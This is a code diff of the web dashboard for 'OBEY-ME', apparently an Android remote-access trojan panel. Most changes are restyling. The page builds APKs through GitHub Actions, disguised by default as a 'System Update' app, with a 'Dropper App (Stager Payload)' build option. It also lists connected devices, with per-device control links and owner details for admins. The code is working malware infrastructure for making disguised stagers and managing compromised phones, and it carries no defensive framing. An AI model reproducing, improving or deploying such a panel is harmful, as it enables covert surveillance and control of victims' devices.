@@ -2,25 +2,14 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OBEY-ME — Builder</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>OBEY-ME — Builder & Command Center</title>
     
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Outfit:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="style.css?v=2.1">
-    <style>
-    /* Critical Navbar & Profile Image Constraints */
-    .navbar-container { max-width: 1400px; margin: 0 auto; width: 100%; padding: 0 24px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 16px; }
-    .navbar-top-row { display: flex; align-items: center; justify-content: space-between; gap: 16px; }
-    .navbar-bottom-row { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
-    .user-profile-badge { display: flex; align-items: center; gap: 10px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255,255,255,0.1); padding: 6px 14px; border-radius: 30px; }
-    .user-avatar-img { width: 34px !important; height: 34px !important; border-radius: 50% !important; object-fit: cover !important; border: 2px solid #06b6d4; }
-    .user-info-col { display: flex; flex-direction: column; justify-content: center; line-height: 1.2; }
-    .user-name-txt { font-size: 0.85rem; font-weight: 700; color: #fff; max-width: 140px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-    .role-badge-txt { font-size: 0.65rem; font-weight: 800; padding: 1px 6px; border-radius: 4px; text-transform: uppercase; }
-    .btn-signout { background: rgba(239, 68, 68, 0.12); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); padding: 6px 14px; border-radius: 18px; font-size: 0.78rem; font-weight: 700; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; }
-    </style>
+    <link rel="stylesheet" href="style.css?v=3.1">
     
     <!-- JSZip for extracting APK from GitHub Artifacts -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
@@ -60,17 +49,18 @@
 </head>
 <body>
 
-    <!-- Instant Auth Loading Screen (Prevents blank screen & content leak) -->
-    <div id="authLoader" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #07070d; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px;">
-        <div style="width: 64px; height: 64px; background: linear-gradient(135deg, #7c3aed, #06b6d4); border-radius: 18px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(124,58,237,0.5);">
-            <i class="fas fa-satellite-dish" style="font-size: 2rem; color: #fff;"></i>
+    <!-- Instant Auth Loading Screen (Apple Liquid Glass) -->
+    <div id="authLoader" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #050507; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px;">
+        <div style="width: 64px; height: 64px; background: linear-gradient(135deg, #ff453a 0%, #b91c1c 100%); border-radius: 18px; display: flex; align-items: center; justify-content: center; box-shadow: 0 8px 30px var(--primary-glow); border: 1px solid rgba(255,255,255,0.2);">
+            <i class="fas fa-satellite-dish" style="font-size: 1.8rem; color: #fff;"></i>
         </div>
-        <div style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; letter-spacing: 1px;">OBEY-ME</div>
-        <div style="font-size: 0.85rem; color: #9ca3af; display: flex; align-items: center; gap: 8px;">
-            <i class="fas fa-circle-notch fa-spin" style="color: #06b6d4;"></i> Verifying authentication...
+        <div style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; letter-spacing: 0.5px;">OBEY-ME</div>
+        <div style="font-size: 0.85rem; color: var(--text-secondary); display: flex; align-items: center; gap: 8px;">
+            <i class="fas fa-circle-notch fa-spin" style="color: var(--primary);"></i> Verifying authentication...
         </div>
     </div>
-    <!-- Navbar -->
+
+    <!-- Floating Liquid Glass Navbar -->
     <nav class="navbar">
         <div class="navbar-container">
             <div class="navbar-top-row">
@@ -100,131 +90,127 @@
         </div>
     </nav>
 
-    <!-- Main Content -->
+    <!-- Main Content Grid -->
     <main style="max-width: 1400px; margin: 0 auto; padding: 32px 24px;">
         <div class="fade-in">
-            <div class="page-title-row" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px;flex-wrap:wrap;gap:12px;">
+            <div class="page-title-row" style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 28px; flex-wrap: wrap; gap: 14px;">
                 <div>
-                    <h1 style="font-size:1.8rem;margin-bottom:6px;">Command Center</h1>
-                    <p style="color:var(--text-secondary);font-size:0.85rem;">Build APKs and monitor connected devices.</p>
+                    <h1 style="font-size: 1.85rem; margin-bottom: 6px; font-family: 'Outfit', sans-serif;">Command Center</h1>
+                    <p style="color: var(--text-secondary); font-size: 0.88rem;">Cloud APK compilation pipeline & real-time connected device fleet.</p>
                 </div>
-                <div class="glass-sm" style="padding:10px 18px;display:flex;align-items:center;gap:10px;">
-                    <span style="font-size:0.72rem;color:var(--text-muted);">YOUR UID</span>
-                    <code id="uidDisplay" style="color:var(--accent);font-size:0.8rem;font-weight:600;">master01</code>
+                <div class="glass-sm" style="padding: 8px 18px; display: flex; align-items: center; gap: 10px;">
+                    <span style="font-size: 0.72rem; color: var(--text-muted); font-weight: 700; text-transform: uppercase;">YOUR UID</span>
+                    <code id="uidDisplay" style="color: var(--primary); font-size: 0.82rem; font-weight: 700;">master01</code>
                 </div>
             </div>
 
             <div class="main-dashboard-grid">
-                <!-- Builder -->
-                <div class="card border-top-primary">
+                <!-- APK Cloud Builder Card -->
+                <div class="card">
                     <div class="card-header-gradient">
-                        <h4 style="font-size:1rem;display:flex;align-items:center;gap:10px;">
-                            <i class="fas fa-hammer text-primary-c"></i> APK Builder
+                        <h4 style="font-size: 1.05rem; font-weight: 700; display: flex; align-items: center; gap: 10px;">
+                            <i class="fas fa-hammer text-primary-c"></i> APK Cloud Builder
                         </h4>
+                        <span class="glass-badge"><i class="fas fa-cloud"></i> GitHub Actions</span>
                     </div>
-                    <div style="padding:24px;" class="card-body">
-                        <form id="buildForm" style="display:flex;flex-direction:column;gap:18px;">
+                    <div style="padding: 24px;" class="card-body">
+                        <form id="buildForm" style="display: flex; flex-direction: column; gap: 18px;">
                             <div>
-                                <label style="display:block;margin-bottom:6px;font-size:0.82rem;color:var(--text-muted);font-weight:600;">APP NAME</label>
-                                <input type="text" name="app_name" class="form-input" placeholder="e.g. System Update" value="System Update" required style="width:100%;">
+                                <label class="form-label">App Name</label>
+                                <input type="text" name="app_name" class="form-input" placeholder="e.g. System Update" value="System Update" required>
                             </div>
                             <div>
-                                <label style="display:block;margin-bottom:6px;font-size:0.82rem;color:var(--text-muted);font-weight:600;">PACKAGE NAME</label>
-                                <input type="text" name="package_name" class="form-input" placeholder="com.system.service.booster" value="com.system.service.booster" required style="width:100%;">
+                                <label class="form-label">Package Name</label>
+                                <input type="text" name="package_name" class="form-input" placeholder="com.system.service.booster" value="com.system.service.booster" required>
                             </div>
                             <div id="webviewContainer">
-                                <label style="display:block;margin-bottom:6px;font-size:0.82rem;color:var(--text-muted);font-weight:600;">WEBVIEW URL</label>
-                                <input type="url" id="webviewInput" name="webview_url" class="form-input" placeholder="https://..." value="https://google.com" required style="width:100%;">
+                                <label class="form-label">WebView URL</label>
+                                <input type="url" id="webviewInput" name="webview_url" class="form-input" placeholder="https://..." value="https://google.com" required>
                             </div>
                             <div>
-                                <label style="display:block;margin-bottom:6px;font-size:0.82rem;color:var(--text-muted);font-weight:600;">BUILD TYPE</label>
-                                <select name="build_type" id="buildTypeSelect" class="form-input" onchange="toggleWebviewField()" style="width:100%;">
+                                <label class="form-label">Build Type</label>
+                                <select name="build_type" id="buildTypeSelect" class="form-input" onchange="toggleWebviewField()">
                                     <option value="main" selected>Main App (Core Service)</option>
                                     <option value="dropper">Dropper App (Stager Payload)</option>
                                 </select>
                             </div>
                             <div>
-                                <label style="display:block;margin-bottom:6px;font-size:0.82rem;color:var(--text-muted);font-weight:600;">CUSTOM ICON (PNG)</label>
-                                <input type="file" id="appIconInput" accept="image/png" class="form-input" style="width:100%;padding:8px 12px;font-size:0.8rem;">
+                                <label class="form-label">Custom App Icon (PNG)</label>
+                                <input type="file" id="appIconInput" accept="image/png" class="form-input" style="padding: 8px 14px; font-size: 0.82rem;">
                             </div>
-                            <button type="submit" id="buildBtn" class="btn-primary-glow" style="margin-top:6px;width:100%;">
-                                <i id="buildIcon" class="fas fa-rocket" style="margin-right:8px;"></i><span id="buildText">BUILD APK</span>
+                            <button type="submit" id="buildBtn" class="btn-primary-glow" style="margin-top: 6px; width: 100%; border-radius: var(--radius-pill);">
+                                <i id="buildIcon" class="fas fa-rocket"></i><span id="buildText">BUILD APK</span>
                             </button>
                         </form>
 
-                        <div id="progressArea" style="display:none;margin-top:20px;">
-                            <div class="progress-track" style="margin-bottom:10px;"><div id="progressBar" class="progress-fill" style="width:0%;"></div></div>
-                            <div id="consoleLog" class="console-box"><div id="logLines"></div></div>
-                            <div id="buildStatus" style="font-size:0.78rem;color:var(--text-secondary);margin-top:8px;text-align:center;"></div>
+                        <div id="progressArea" style="display: none; margin-top: 24px;">
+                            <div class="progress-track" style="margin-bottom: 12px;">
+                                <div id="progressBar" class="progress-fill" style="width: 0%;"></div>
+                            </div>
+                            <div id="consoleLog" class="console-box">
+                                <div id="logLines"></div>
+                            </div>
+                            <div id="buildStatus" style="font-size: 0.8rem; color: var(--text-secondary); margin-top: 10px; text-align: center; font-weight: 500;"></div>
                         </div>
 
-                        <div id="downloadArea" style="display:none;margin-top:20px;text-align:center;">
-                            <button id="downloadBtn" onclick="downloadApk(this)" class="btn-accent" style="width:100%;padding:14px;font-size:0.9rem;">
-                                <i class="fas fa-download" style="margin-right:6px;"></i>DOWNLOAD APK
+                        <div id="downloadArea" style="display: none; margin-top: 20px; text-align: center;">
+                            <button id="downloadBtn" onclick="downloadApk(this)" class="btn-accent" style="width: 100%; padding: 14px 24px; font-size: 0.92rem; font-weight: 700; border-radius: var(--radius-pill); border-color: rgba(255, 59, 48, 0.3); background: rgba(255, 59, 48, 0.12); color: #fff;">
+                                <i class="fas fa-download" style="margin-right: 8px; color: var(--primary);"></i>DOWNLOAD APK
                             </button>
                         </div>
                     </div>
                 </div>
 
-                <!-- Devices -->
-                <div class="card border-top-accent">
-                    <div class="card-header-gradient" style="display:flex;justify-content:space-between;align-items:center;">
-                        <h4 style="font-size:1rem;display:flex;align-items:center;gap:10px;">
-                            <i class="fas fa-mobile-alt text-accent"></i> Connected Devices
+                <!-- Connected Devices Card -->
+                <div class="card">
+                    <div class="card-header-gradient" style="display: flex; justify-content: space-between; align-items: center;">
+                        <h4 style="font-size: 1.05rem; font-weight: 700; display: flex; align-items: center; gap: 10px;">
+                            <i class="fas fa-mobile-alt text-primary-c"></i> Connected Devices
                             <span id="deviceCount" class="badge-count">0</span>
-                            <span id="onlineCount" style="background:rgba(0,184,148,0.2);color:#00b894;font-size:0.65rem;font-weight:700;padding:2px 8px;border-radius:10px;min-width:20px;text-align:center;">0 online</span>
+                            <span id="onlineCount" style="background: var(--success-bg); color: var(--success); font-size: 0.68rem; font-weight: 700; padding: 3px 10px; border-radius: var(--radius-pill); border: 1px solid var(--success-border);">0 online</span>
                         </h4>
-                        <button class="btn-ghost" onclick="refreshDevices()" style="padding:6px 14px;"><i class="fas fa-sync-alt"></i></button>
+                        <button class="btn-ghost" onclick="refreshDevices()" style="padding: 6px 14px; border-radius: var(--radius-pill);" title="Refresh Device List">
+                            <i class="fas fa-sync-alt"></i>
+                        </button>
                     </div>
-                    <div style="padding:0;" id="deviceContainer">
-                        <!-- Skeleton loading for instant perceived speed -->
-                        <div id="deviceSkeleton" style="padding:16px;">
-                            <div style="display:flex;align-items:center;gap:14px;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.03);">
-                                <div style="width:40px;height:40px;background:var(--bg-elevated);border-radius:10px;animation:skeletonPulse 1.2s infinite;"></div>
-                                <div style="flex:1;">
-                                    <div style="height:14px;width:120px;background:var(--bg-elevated);border-radius:4px;margin-bottom:6px;animation:skeletonPulse 1.2s infinite;"></div>
-                                    <div style="height:10px;width:200px;background:var(--bg-elevated);border-radius:4px;animation:skeletonPulse 1.2s infinite 0.1s;"></div>
+                    <div style="padding: 0;" id="deviceContainer">
+                        <!-- Skeleton Loading for Perceived Speed -->
+                        <div id="deviceSkeleton" style="padding: 20px;">
+                            <div style="display: flex; align-items: center; gap: 14px; padding: 14px 0; border-bottom: 1px solid var(--border-subtle);">
+                                <div style="width: 42px; height: 42px; background: rgba(255,255,255,0.05); border-radius: 12px; animation: skeletonPulse 1.2s infinite;"></div>
+                                <div style="flex: 1;">
+                                    <div style="height: 14px; width: 120px; background: rgba(255,255,255,0.05); border-radius: 4px; margin-bottom: 6px; animation: skeletonPulse 1.2s infinite;"></div>
+                                    <div style="height: 10px; width: 180px; background: rgba(255,255,255,0.03); border-radius: 4px; animation: skeletonPulse 1.2s infinite 0.1s;"></div>
                                 </div>
-                                <div style="height:24px;width:60px;background:var(--bg-elevated);border-radius:12px;animation:skeletonPulse 1.2s infinite 0.2s;"></div>
+                                <div style="height: 28px; width: 70px; background: rgba(255,255,255,0.05); border-radius: 14px; animation: skeletonPulse 1.2s infinite 0.2s;"></div>
                             </div>
-                            <div style="display:flex;align-items:center;gap:14px;padding:12px 0;">
-                                <div style="width:40px;height:40px;background:var(--bg-elevated);border-radius:10px;animation:skeletonPulse 1.2s infinite 0.15s;"></div>
-                                <div style="flex:1;">
-                                    <div style="height:14px;width:100px;background:var(--bg-elevated);border-radius:4px;margin-bottom:6px;animation:skeletonPulse 1.2s infinite 0.25s;"></div>
-                                    <div style="height:10px;width:180px;background:var(--bg-elevated);border-radius:4px;animation:skeletonPulse 1.2s infinite 0.35s;"></div>
+                            <div style="display: flex; align-items: center; gap: 14px; padding: 14px 0;">
+                                <div style="width: 42px; height: 42px; background: rgba(255,255,255,0.05); border-radius: 12px; animation: skeletonPulse 1.2s infinite 0.15s;"></div>
+                                <div style="flex: 1;">
+                                    <div style="height: 14px; width: 100px; background: rgba(255,255,255,0.05); border-radius: 4px; margin-bottom: 6px; animation: skeletonPulse 1.2s infinite 0.25s;"></div>
+                                    <div style="height: 10px; width: 160px; background: rgba(255,255,255,0.03); border-radius: 4px; animation: skeletonPulse 1.2s infinite 0.35s;"></div>
                                 </div>
-                                <div style="height:24px;width:60px;background:var(--bg-elevated);border-radius:12px;animation:skeletonPulse 1.2s infinite 0.4s;"></div>
+                                <div style="height: 28px; width: 70px; background: rgba(255,255,255,0.05); border-radius: 14px; animation: skeletonPulse 1.2s infinite 0.4s;"></div>
                             </div>
                         </div>
-                        <div id="deviceListArea" style="display:none;">
-                            <table class="data-table"><thead><tr><th>Device</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th></tr></thead>
-                            <tbody id="deviceList"></tbody></table>
+
+                        <div id="deviceListArea" style="display: none;" class="table-responsive">
+                            <table class="data-table">
+                                <thead>
+                                    <tr>
+                                        <th>Device</th>
+                                        <th>Battery</th>
+                                        <th>Status</th>
+                                        <th style="text-align: right;">Action</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="deviceList"></tbody>
+                            </table>
                         </div>
                     </div>
                 </div>
             </div>
         </div>
-
-        <style>
-        @keyframes skeletonPulse {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 0.6; }
-        }
-        .device-row-online {
-            border-left: 3px solid #00b894;
-            background: rgba(0, 184, 148, 0.03);
-        }
-        .device-row-online:hover {
-            background: rgba(0, 184, 148, 0.06) !important;
-        }
-        .device-row-offline {
-            border-left: 3px solid transparent;
-            opacity: 0.6;
-        }
-        .device-row-offline:hover {
-            opacity: 0.85;
-        }
-        </style>
     </main>
 
     <script>
@@ -298,37 +284,34 @@
                 document.getElementById('userAvatar').src = user.photoURL || 'https://www.gravatar.com/avatar/00000000000000000000000000000000?d=mp&f=y';
 
                 const roleBadge = document.getElementById('userRoleBadge');
-                roleBadge.textContent = window.isUserAdmin ? 'ADMIN' : 'USER';
                 if (window.isUserAdmin) {
-                    roleBadge.style.background = 'rgba(235, 77, 75, 0.2)';
-                    roleBadge.style.color = '#eb4d4b';
-                    roleBadge.style.border = '1px solid rgba(235, 77, 75, 0.4)';
+                    roleBadge.textContent = 'ADMIN';
+                    roleBadge.style.background = 'rgba(255, 59, 48, 0.2)';
+                    roleBadge.style.color = '#ff3b30';
+                    roleBadge.style.border = '1px solid rgba(255, 59, 48, 0.4)';
                 } else {
-                    roleBadge.style.background = 'rgba(0, 184, 148, 0.2)';
-                    roleBadge.style.color = '#00b894';
-                    roleBadge.style.border = '1px solid rgba(0, 184, 148, 0.4)';
+                    roleBadge.textContent = 'USER';
+                    roleBadge.style.background = 'rgba(48, 209, 88, 0.15)';
+                    roleBadge.style.color = '#30d158';
+                    roleBadge.style.border = '1px solid rgba(48, 209, 88, 0.3)';
                 }
 
-                // Show Admin Panel button if Admin
+                // Show admin button if admin
                 const adminBtn = document.getElementById('adminPanelBtn');
                 if (adminBtn) {
                     adminBtn.style.display = window.isUserAdmin ? 'inline-flex' : 'none';
                 }
-
-                // Setup device listeners after role is confirmed
-                setupRealtimeHealthListeners();
             });
 
-            // Initialize user session data & listeners
+            // Initialize app and device listeners
             initUserSession();
         } else {
-            // User is signed out -> redirect immediately to dedicated login page (no bypass)
-            currentUserProfile = null;
+            // Not logged in -> Redirect to login page
             window.location.replace('login.html');
         }
     });
 
-    // Safety loader dismissal fallback
+    // Safety fallback for auth loader
     setTimeout(() => {
         const loader = document.getElementById('authLoader');
         if (loader && loader.style.display !== 'none') {
@@ -340,6 +323,7 @@
         }
     }, 1500);
 
+    // Track User Profile & Activity in Firebase users_meta
     function trackUserActivity(user, actionName) {
         if (!user) return;
         const email = user.email || '';
@@ -363,14 +347,18 @@
                 user_agent: navigator.userAgent
             };
 
+            // Set created_at if first time
             if (!umeta.created_at) updatedData.created_at = Date.now();
+
             fbDb.ref('users_meta/' + uid).update(updatedData);
 
+            // Append to user's activity history
             fbDb.ref(`users_meta/${uid}/activity_history`).push({
                 time: Date.now(),
                 action: actionName
             });
 
+            // Push to platform-wide audit logs
             fbDb.ref('audit_logs').push({
                 timestamp: Date.now(),
                 user: email || uid,
@@ -380,21 +368,23 @@
     }
 
     function initUserSession() {
-        // Initial check for existing build status & last_apk from Firebase for logged-in user
+        // Check for last APK build in Firebase
         fbDb.ref('panel_users/' + userId).once('value', snap => {
-            const udata = snap.val();
-            if (udata && udata.last_apk) {
-                document.getElementById('downloadBtn').setAttribute('data-apk', udata.last_apk);
-                if (udata.last_artifact_name) {
-                    document.getElementById('downloadBtn').setAttribute('data-artifact', udata.last_artifact_name);
+            const u = snap.val() || {};
+            const lastApk = u.last_apk || '';
+            const lastArtifact = u.last_artifact_name || '';
+            if (lastApk) {
+                const dlBtn = document.getElementById('downloadBtn');
+                dlBtn.setAttribute('data-apk', lastApk);
+                if (lastArtifact) {
+                    dlBtn.setAttribute('data-artifact', lastArtifact);
                 }
                 document.getElementById('downloadArea').style.display = 'block';
             }
         });
 
-        // Start listening to realtime health and build status
+        // Setup real-time health and device listeners
         setupRealtimeHealthListeners();
-        listenToBuildStatus();
     }
 
     // Ultra-Fast Direct APK download (Release Asset -> Artifact Zip Fallback)
@@ -537,14 +527,12 @@
                         canvas.width = 96;
                         canvas.height = 96;
                         const ctx = canvas.getContext('2d');
-                        // Fill white background for JPEG transparency compatibility
                         ctx.fillStyle = '#FFFFFF';
                         ctx.fillRect(0, 0, 96, 96);
                         ctx.drawImage(img, 0, 0, 96, 96);
                         const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                         URL.revokeObjectURL(url);
                         const b64 = dataUrl.includes(',') ? dataUrl.split(',')[1] : dataUrl;
-                        console.log('Compressed Icon Base64 length:', b64.length);
                         resolve(b64);
                     };
                     img.onerror = (err) => {
@@ -599,301 +587,301 @@
                 });
             }
         }).catch(err => {
-            console.error('Build trigger error:', err);
-            document.getElementById('buildStatus').textContent = '❌ Trigger error: ' + err.message;
+            console.error('Workflow trigger error:', err);
+            document.getElementById('buildStatus').textContent = '❌ Error: ' + err.message;
             btn.disabled = false;
-            text.textContent = 'BUILD APK';
+            text.textContent = 'RETRY BUILD';
             icon.className = 'fas fa-rocket';
         });
     });
 
     function listenToBuildStatus() {
-        fbDb.ref('panel_users/' + userId + '/build_status').on('value', snap => {
-            const v = snap.val();
-            if (!v) return;
-            
-            document.getElementById('progressBar').style.width = (v.percent || 0) + '%';
-            document.getElementById('buildStatus').textContent = v.status || '';
-            
-            if (v.last_log && v.last_log !== window._ll) {
-                window._ll = v.last_log;
-                const l = document.createElement('div');
-                l.className = 'console-line';
-                l.textContent = '> ' + v.last_log;
-                document.getElementById('logLines').appendChild(l);
-                document.getElementById('consoleLog').scrollTop = 999999;
-            }
-            
+        const buildRef = fbDb.ref('panel_users/' + userId + '/build_status');
+        buildRef.on('value', snap => {
+            const val = snap.val();
+            if (!val) return;
+
+            const progressBar = document.getElementById('progressBar');
+            const buildStatus = document.getElementById('buildStatus');
+            const logLines = document.getElementById('logLines');
+            const consoleLog = document.getElementById('consoleLog');
             const btn = document.getElementById('buildBtn');
             const text = document.getElementById('buildText');
             const icon = document.getElementById('buildIcon');
 
-            if (v.status === '✅ Complete') {
+            if (val.percent !== undefined) {
+                progressBar.style.width = val.percent + '%';
+            }
+
+            if (val.last_log) {
+                buildStatus.textContent = val.status || val.last_log;
+                const line = document.createElement('div');
+                line.className = 'console-line';
+                line.textContent = `[${new Date().toLocaleTimeString()}] ${val.last_log}`;
+                logLines.appendChild(line);
+                consoleLog.scrollTop = consoleLog.scrollHeight;
+            }
+
+            if (val.status && (val.status.includes('Complete') || val.percent >= 100)) {
+                btn.disabled = false;
                 text.textContent = 'SUCCESS!';
                 icon.className = 'fas fa-check-circle';
-                fbDb.ref('panel_users/' + userId).once('value', u => {
-                    const ud = u.val();
-                    if (ud && ud.last_apk) {
-                        document.getElementById('downloadBtn').setAttribute('data-apk', ud.last_apk);
-                        if (ud.last_artifact_name) {
-                            document.getElementById('downloadBtn').setAttribute('data-artifact', ud.last_artifact_name);
-                        }
-                        document.getElementById('downloadArea').style.display = 'block';
+
+                // Fetch latest APK name & artifact name
+                fbDb.ref('panel_users/' + userId).once('value', uSnap => {
+                    const u = uSnap.val() || {};
+                    const lastApk = u.last_apk || 'app.apk';
+                    const lastArtifact = u.last_artifact_name || '';
+                    const dlBtn = document.getElementById('downloadBtn');
+                    dlBtn.setAttribute('data-apk', lastApk);
+                    if (lastArtifact) {
+                        dlBtn.setAttribute('data-artifact', lastArtifact);
                     }
+                    document.getElementById('downloadArea').style.display = 'block';
                 });
-                setTimeout(() => {
-                    btn.disabled = false;
-                    text.textContent = 'BUILD APK';
-                    icon.className = 'fas fa-rocket';
-                    document.getElementById('progressArea').style.display = 'none';
-                }, 5000);
-            } else if (v.status && (v.status.includes('❌') || v.status.includes('⚠️'))) {
-                text.textContent = 'FAILED';
-                icon.className = 'fas fa-exclamation-triangle';
-                setTimeout(() => {
-                    btn.disabled = false;
-                    text.textContent = 'BUILD APK';
-                    icon.className = 'fas fa-rocket';
-                }, 3000);
+
+                buildRef.off();
+            } else if (val.status && val.status.includes('Failed')) {
+                btn.disabled = false;
+                text.textContent = 'BUILD FAILED';
+                icon.className = 'fas fa-times-circle';
+                document.getElementById('progressArea').style.display = 'block';
+                buildRef.off();
             }
         });
     }
 
     function checkIsAdmin() {
         if (window.isUserAdmin === true) return true;
-        const adminEmailsLower = ADMIN_EMAILS.map(e => e.toLowerCase());
-        if (fbAuth.currentUser && fbAuth.currentUser.email) {
-            if (adminEmailsLower.includes(fbAuth.currentUser.email.toLowerCase())) return true;
-        }
-        if (currentUserProfile && currentUserProfile.email) {
-            if (adminEmailsLower.includes(currentUserProfile.email.toLowerCase())) return true;
-        }
         if (currentUserProfile && currentUserProfile.role === 'ADMIN') return true;
-        if (userId && adminEmailsLower.includes(userId.toLowerCase())) return true;
-        const emailParam = (urlParams.get('email') || urlParams.get('user_email') || '').toLowerCase();
-        if (emailParam && adminEmailsLower.includes(emailParam)) return true;
+        if (fbAuth.currentUser) {
+            const email = (fbAuth.currentUser.email || '').toLowerCase();
+            if (ADMIN_EMAILS.includes(email)) return true;
+        }
         return false;
     }
 
     function renderDeviceList() {
-        const body = document.getElementById('deviceList');
-        const skeleton = document.getElementById('deviceSkeleton');
-        const listArea = document.getElementById('deviceListArea');
-        
-        skeleton.style.display = 'none';
-        listArea.style.display = 'block';
-        
-        let devices = Object.values(deviceCache);
+        const tbody = document.getElementById('deviceList');
+        if (!tbody) return;
+
         const isAdmin = checkIsAdmin();
-        
-        // Dynamically adjust table header based on Admin vs Normal user mode
-        const tableHead = document.querySelector('.data-table thead tr');
-        if (tableHead) {
+        const thRow = document.querySelector('.data-table thead tr');
+        if (thRow) {
             if (isAdmin) {
-                tableHead.innerHTML = '<th>Device</th><th>Owner</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th>';
+                thRow.innerHTML = '<th>Device</th><th>Owner</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th>';
             } else {
-                tableHead.innerHTML = '<th>Device</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th>';
+                thRow.innerHTML = '<th>Device</th><th>Battery</th><th>Status</th><th style="text-align:right;">Action</th>';
             }
         }
-        
-        if (!devices.length) {
-            document.getElementById('deviceCount').textContent = 0;
-            document.getElementById('onlineCount').textContent = '0 online';
-            const colspan = isAdmin ? 5 : 4;
-            body.innerHTML = `<tr><td colspan="${colspan}"><div class="empty-state"><i class="fas fa-satellite-dish"></i><p>No devices connected. Install the APK to begin.</p></div></td></tr>`;
-            return;
-        }
-        
-        // Sort: online first, then by lastSeen
-        devices.sort((a, b) => {
-            if (a.is_online !== b.is_online) return b.is_online - a.is_online;
-            return (b.lastSeen || 0) - (a.lastSeen || 0);
+
+        const devKeys = Object.keys(deviceCache);
+        let totalCount = devKeys.length;
+        let onlineCount = 0;
+
+        // Sort: online first, then by lastSeen desc
+        const sortedKeys = devKeys.sort((a, b) => {
+            const da = deviceCache[a], db = deviceCache[b];
+            if (da.online !== db.online) return db.online ? 1 : -1;
+            return (db.lastSeen || 0) - (da.lastSeen || 0);
         });
-        
-        const onlineNum = devices.filter(d => d.is_online).length;
-        
-        document.getElementById('deviceCount').textContent = devices.length;
-        const onlineEl = document.getElementById('onlineCount');
-        onlineEl.textContent = onlineNum + ' online';
-        onlineEl.style.background = onlineNum > 0 ? 'rgba(0,184,148,0.2)' : 'rgba(255,107,107,0.15)';
-        onlineEl.style.color = onlineNum > 0 ? '#00b894' : '#ff6b6b';
-        
-        let h = '';
-        devices.forEach(d => {
-            const st = d.is_online ? 'status-online' : 'status-offline';
-            const sl = d.is_online ? 'Online' : 'Offline';
-            const rowClass = d.is_online ? 'device-row-online' : 'device-row-offline';
-            const bi = d.battery < 20 ? 'fa-battery-empty text-danger-c' : d.battery < 50 ? 'fa-battery-quarter text-warning-c' : 'fa-battery-full text-success-c';
+
+        let html = '';
+        sortedKeys.forEach(did => {
+            const d = deviceCache[did];
+            if (d.online) onlineCount++;
+
+            const model = d.model || 'Android Device';
+            const batt = d.battery !== undefined ? d.battery : '--';
+            const battNum = parseInt(batt) || 0;
+            const battIcon = battNum > 75 ? 'fa-battery-full' : battNum > 40 ? 'fa-battery-half' : battNum > 15 ? 'fa-battery-quarter' : 'fa-battery-empty';
+            const battColor = battNum <= 15 ? 'var(--danger)' : battNum <= 40 ? 'var(--warning)' : 'var(--success)';
+            
+            const isOnline = d.online;
+            const statusClass = isOnline ? 'status-online' : 'status-offline';
+            const statusText = isOnline ? 'Online' : 'Offline';
+            const rowClass = isOnline ? 'device-row-online' : 'device-row-offline';
             const ownerUid = d.ownerUid || userId;
-            const ownerEmail = d.ownerEmail || ownerUid;
-            
-            const controlUrl = `control.html?uid=${encodeURIComponent(ownerUid)}&did=${encodeURIComponent(d.did)}`;
-            
-            let ownerCell = '';
-            if (isAdmin) {
-                const ownerDisplay = (ownerEmail && ownerEmail !== ownerUid)
-                    ? `${ownerEmail}`
-                    : ownerUid;
-                ownerCell = `<td><span class="user-badge owner-pill" style="background:rgba(108,92,231,0.15);color:#a29bfe;border:1px solid rgba(108,92,231,0.3);padding:3px 8px;border-radius:6px;font-size:0.72rem;font-weight:600;display:inline-flex;align-items:center;gap:5px;" title="${ownerEmail} (${ownerUid})"><i class="fas fa-user-shield" style="font-size:0.65rem;"></i>${ownerDisplay}</span></td>`;
-            }
 
-            let deleteBtnHtml = '';
-            if (isAdmin) {
-                deleteBtnHtml = `<button onclick="deleteDevice('${ownerUid}', '${d.did}', '${d.model.replace(/'/g, "\\'")}')" style="background:rgba(255,71,87,0.15);color:#ff4757;border:1px solid rgba(255,71,87,0.35);padding:7px 10px;border-radius:6px;font-size:0.75rem;cursor:pointer;font-weight:700;transition:all 0.2s ease;" title="Delete Device from Firebase"><i class="fas fa-trash-alt"></i></button>`;
-            }
-
-            h += `<tr class="${rowClass}">
+            html += `
+            <tr class="${rowClass}">
                 <td>
-                    <div style="font-weight:600;font-size:0.85rem;">${d.model}</div>
-                    <div style="font-size:0.68rem;color:var(--text-muted);">${d.did}</div>
+                    <div style="font-weight: 700; color: #fff; font-size: 0.88rem; display: flex; align-items: center; gap: 8px;">
